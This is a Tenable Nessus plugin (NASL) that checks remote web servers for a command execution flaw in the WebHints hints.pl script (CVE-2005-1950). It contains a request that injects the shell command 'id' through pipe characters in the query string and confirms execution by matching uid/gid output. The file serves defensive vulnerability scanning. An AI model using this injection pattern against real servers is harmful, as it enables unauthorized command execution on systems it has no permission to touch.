#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(18478);
 script_version("$Revision: 1.17 $");

 script_cve_id("CVE-2005-1950");
 script_bugtraq_id(13930);
 script_osvdb_id(17287);
  
 script_name(english:"WebHints hints.pl Arbitrary Command Execution");
  script_set_attribute(
    attribute:"synopsis",
    value:
"A web application on the remote host has a command execution
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host is running the WebHints scripts.

This version of WebHints has a remote command execution vulnerability
in hints.pl.  A remote attacker could exploit this to execute
arbitrary commands on the system."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://seclists.org/bugtraq/2005/Jun/73"
  );
  script_set_attribute(
    attribute:"solution",
    value:
"There is no known solution at this time.  Remove this script from the
web server."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/06/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/06/09");
 script_cvs_date("$Date: 2016/11/15 19:41:08 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();
 
 script_summary(english:"Checks for WebHints remote command execution flaw");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");


http_check_remote_code (
			check_request:"/hints.pl?|id|",
			extra_check:"WebHints [0-9]+\.[0-9]+</A></SMALL></P></CENTER>",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
